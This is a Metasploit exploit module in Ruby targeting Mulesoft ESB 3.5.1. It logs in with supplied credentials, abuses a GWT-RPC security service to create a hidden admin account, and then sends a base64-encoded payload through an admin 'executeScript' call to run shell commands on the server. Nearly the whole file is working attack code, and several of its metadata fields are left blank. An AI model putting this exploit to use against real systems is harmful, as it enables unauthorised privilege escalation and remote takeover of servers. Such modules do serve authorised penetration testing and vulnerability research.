##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name'	=> 'Mulesoft ESB 3.5.1 Authenticated Privilege Escalation -> RCE',
      'Description' => %q{
      },
      'Author'      =>
        [
          'bperry'
        ],
      'License'     => 'VolatileMinds',
      'References'  =>
        [
        ],
      'DisclosureDate' => '',
      'Privileged'     => false,
      'Platform'       => %w{ linux unix },
      'Payload'	=>
        {
          'DisableNops' => true
        },
      'Targets'	=>
        [
          [ 'CMD',
            {
            'Arch' => ARCH_CMD,
            'Platform' => 'unix'
            }
          ],
        ],
      'DefaultTarget'  => 0
      ))

    register_options(
      [
	      OptString.new('TARGETURI',[ true, 'The target URI', '/mmc-3.5.1/']),
        OptString.new('USERNAME', [ true, 'The username to authenticate as', 'admin' ]),
        OptString.new('PASSWORD', [ true, 'The password for the specified username', 'admin' ]),
      ], self.class)
  end

  def exploit
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'login.jsp')
    })

    cookie = res.headers['Set-Cookie']

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'j_spring_security_check'),
      'method' => 'POST',
      'vars_post' => {
        'j_username' => datastore['USERNAME'],
        'j_password' => datastore['PASSWORD']
      },
      'cookie' => cookie
    })

    unless res.headers["Location"] =~ /index.jsp/
      fail_with(Failure::Unknown, "Authentication failed")
    end

    admin_user = Rex::Text.rand_text_alpha(8)
    admin_pass = Rex::Text.rand_text_alpha(8)
    admin_email = Rex::Text.rand_text_alpha(8) + "@" + Rex::Text.rand_text_alpha(8) + ".com"

    create_admin_gwt = "7|0|15|http://192.168.0.22:8585/mmc-3.5.1/com.mulesoft.mmc.MMC/|5192695B02944BAAB195B91AB3FDDA48|org.mule.galaxy.web.rpc.RemoteSecurityService|addUser|org.mule.galaxy.web.rpc.WUser/4112688705|java.lang.String/2004016611|#{admin_email}|java.util.ArrayList/4159755760|298e8098-ff3e-4d13-b37e-3f3d33193ed9|ed4cbe90-085d-4d44-976c-436eb1d78d16|ccd8aee7-30bb-42e1-8218-cfd9261c7af9|d63c1710-e811-4c3c-aeb6-e474742ac084|fdsa|#{admin_user}|#{admin_pass}|1|2|3|4|2|5|6|5|7|8|4|6|9|6|10|6|11|6|12|0|13|0|0|14|15|"

    print_status("Creating admin user with credentials: #{admin_user}:#{admin_pass}")    
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'handler', 'securityService.rpc'),
      'method' => 'POST',
      'cookie' => cookie,
      'data' => create_admin_gwt,
      'ctype' => 'text/x-gwt-rpc; charset=utf-8/'
    })

    unless res.body =~ /OK/
      fail_with(Failure::Unknown, "Could not create admin user")
    end

    print_status("Authenticating with new admin user")
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'j_spring_security_check'),
      'vars_post' => {
        'j_username' => admin_user,
        'j_password' => admin_pass
      }
    })

    unless res.headers["Location"] =~ /index.jsp/
      fail_with(Failure::Unknown, "Could not auth with new admin")
    end

    cookie = res.headers['Set-Cookie']

    shell = "7|0|6|http://192.168.0.22:8585/mmc-3.5.1/com.mulesoft.mmc.MMC/|A2A7B79395FB7F5F9E2246F1D5A0E9FF|org.mule.galaxy.web.rpc.RemoteAdminService|executeScript|java.lang.String/2004016611|proc = ['bash', '-c', 'sh <(base64 --decode <(echo #{Rex::Text.encode_base64(payload.encoded)}))'].execute()|1|2|3|4|1|5|6|"

    print_status("Popping shell")
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'handler', 'admin.rpc'),
      'cookie' => cookie,
      'data' => shell,
      'ctype' => 'text/x-gwt-rpc; charset=utf-8/'
    })

  end
end
